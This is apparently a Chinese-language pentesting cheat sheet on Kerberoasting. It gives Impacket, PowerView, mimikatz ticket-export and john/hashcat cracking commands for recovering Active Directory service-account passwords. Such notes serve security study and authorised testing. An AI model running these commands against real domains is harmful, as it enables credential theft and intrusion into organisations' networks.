---
description: 基于Kerberos认证 / 获取
---

# ✔️ Kerberoasting攻击

## 先决条件

* 已经获得目标域内的基本立足点（普通用户权限即可）
* 需要目标域内用户账户的SPN
* 需要获取到服务票据（TGS）
* 暴破工具 + 字典文件

## 常用工具

### Impacket

* 常用脚本：GetUserSPNs.py

```bash
# 识别SPN
python3 GetUserSPNs.py target.com/svc_tgs:xxxxxxxxxxxxxx -dc-ip 10.10.xxx.xxx
# 请求服务票据TGS
python3 GetUserSPNs.py target.com/svc_tgs:xxxxxxxxxxxxxx -dc-ip 10.10.xxx.xxx -request
```

### Powershell

* 常用脚本：PowerView.ps1

```powershell
# 识别SPN
Get-NetUser -username "svc_tgs" -SPN | select samaccountname, primarygroupid, serviceprincipalname
```

### mimikatz.exe

```powershell
mimikatz.exe
# 先提升权限
privilege::debug
# 获取当前的所有票据并导出
sekurlsa::tickets /export
# 将导出的.kirbi文件转换成txt文件，在用john the ripper或者hashcat进行离线暴破
```

### John the Ripper

```bash
# 离线暴破
john --format=krb5tgs hash.txt rockyou.txt
```

### Hashcat

```bash
# 离线暴破
hashcat -m 13100 hash.txt rockyou.txt
```

{% hint style="info" %}
Kerberoasting攻击在内网渗透中很常见，本质上是通过获取目标域内的服务账户的服务票据（TGS），然后通过离线爆破来还原出明文密码。该攻击方式仅需要有目标域内的普通用户账户权限即可。
{% endhint %}
